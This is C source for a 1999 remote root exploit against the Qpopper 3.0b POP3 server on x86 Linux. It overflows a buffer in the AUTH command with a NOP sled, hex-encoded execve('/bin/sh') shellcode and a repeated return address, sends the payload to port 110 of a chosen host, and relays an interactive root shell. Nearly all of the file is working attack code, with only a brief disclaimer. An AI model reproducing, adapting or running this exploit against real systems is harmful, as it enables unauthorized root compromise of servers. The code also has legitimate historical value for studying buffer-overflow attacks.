/*
 * Qpopper 3.0b remote exploit for x86 Linux (tested on RedHat/2.0.38)
 *
 * Dec 1999 by Mixter <mixter@newyorkoffice.com> / http://1337.tsx.org
 *
 * Exploits pop_msg buffer overflow to spawn a remote root shell.
 * This probably works with the old qpop2 code for bsd, solaris anyone?
 * 
 * WARNING: YOU ARE USING THIS SOFTWARE ON YOUR OWN RISK. THIS IS A
 * PROOF-OF-CONCEPT PROGRAM AND YOU TAKE FULL RESPONSIBILITY FOR WHAT YOU
 * DO WITH IT! DO NOT ABUSE THIS FOR ILLICIT PURPOSES!
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define NOP		0x90
#define LEN		1032
#define CODESTART	880
#define RET		0xbfffd655

/* x86 linux shellcode. this can be a simple execve to /bin/sh on all
   systems, but MUST NOT contain the characters 'x17' or 'x0c' because
   that would split the exploit code into separate arg buffers        */

char *shellcode =
"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89\xf0\xab"
"\x89\xfa\x31\xc0\xab\xb0\x04\x04\x07\xcd\x80\x31\xc0\x89\xc3\x40\xcd\x80"
"\xe8\xd9\xff\xff\xff/bin/sh";

unsigned long resolve (char *);
void term (int, int);
unsigned long get_sp ();

int 
main (int argc, char **argv)
{
  char buffer[LEN];
  char *codeptr = shellcode;
  long retaddr = RET;
  int i, s;
  struct sockaddr_in sin;

  if (argc < 2)
    {
      printf ("usage: %s <host> [offset]\n", argv[0]);
      printf ("use offset -1 to try local esp\n");
      exit (0);
    }

  if (argc > 2)
    {
      if (atoi (argv[2]) == -1)
	{
	  /* 8000 = approx. byte offset to qpopper's top of stack
	     at the time it prints out the auth error message */
	  retaddr = get_sp () - 8000 - LEN;
	  printf ("Using local esp as ret address...\n");
	}
      retaddr += atoi (argv[2]);
    }

  for (i = 0; i < LEN; i++)
    *(buffer + i) = NOP;

  for (i = CODESTART + 2; i < LEN; i += 4)
    *(int *) &buffer[i] = retaddr;

  for (i = CODESTART; i < CODESTART + strlen (shellcode); i++)
    *(buffer + i) = *(codeptr++);

  buffer[0] = 'A';
  buffer[1] = 'U';
  buffer[2] = 'T';
  buffer[3] = 'H';
  buffer[4] = ' ';

  printf ("qpop 3.0 remote root exploit (linux) by Mixter\n");
  printf ("[return address: 0x%lx buffer size: %d code size: %d]\n",
	  retaddr, strlen (buffer), strlen (shellcode));

  fflush (0);

  sin.sin_family = AF_INET;
  sin.sin_port = htons (110);
  sin.sin_addr.s_addr = resolve (argv[1]);
  s = socket (AF_INET, SOCK_STREAM, 0);

  if (connect (s, (struct sockaddr *) &sin, sizeof (struct sockaddr)) < 0)
    {
      perror ("connect");
      exit (0);
    }

  switch (write (s, buffer, strlen (buffer)))
    {
    case 0:
    case -1:
      fprintf (stderr, "write error: %s\n", strerror (errno));
      break;
    default:
      break;
    }
  write (s, "\n\n", 1);
  term (s, 0);

  return 0;
}

unsigned long
resolve (char *host)
{
  struct hostent *he;
  struct sockaddr_in tmp;
  if (inet_addr (host) != -1)
    return (inet_addr (host));
  he = gethostbyname (host);
  if (he)
    memcpy ((caddr_t) & tmp.sin_addr.s_addr, he->h_addr, he->h_length);
  else
    {
      perror ("gethostbyname");
      exit (0);
    }
  return (tmp.sin_addr.s_addr);
}

unsigned long
get_sp (void)
{
  __asm__ ("movl %esp, %eax");
}

void
term (int p, int c)
{
  char buf[LEN];
  fd_set rfds;
  int i;

  while (1)
    {
      FD_ZERO (&rfds);
      FD_SET (p, &rfds);
      FD_SET (c, &rfds);
      if (select ((p > c ? p : c) + 1, &rfds, NULL, NULL, NULL) < 1)
	return;
      if (FD_ISSET (c, &rfds))
	{
	  if ((i = read (c, buf, sizeof (buf))) < 1)
	    exit (0);
	  else
	    write (p, buf, i);
	}
      if (FD_ISSET (p, &rfds))
	{
	  if ((i = read (p, buf, sizeof (buf))) < 1)
	    exit (0);
	  else
	    write (c, buf, i);
	}
    }
}